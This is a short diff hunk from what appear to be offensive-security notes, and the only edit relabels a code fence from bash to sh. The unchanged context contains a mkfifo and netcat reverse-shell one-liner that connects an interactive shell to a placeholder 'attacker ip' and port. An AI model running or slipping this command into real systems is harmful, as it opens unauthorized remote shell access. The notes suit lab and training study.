@@ -28,7 +28,7 @@ Pipe output from things like `strings` here to finds hashes. The above will work
 
 or if no `-e`
 
-```bash
+```sh
 mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f
 ```
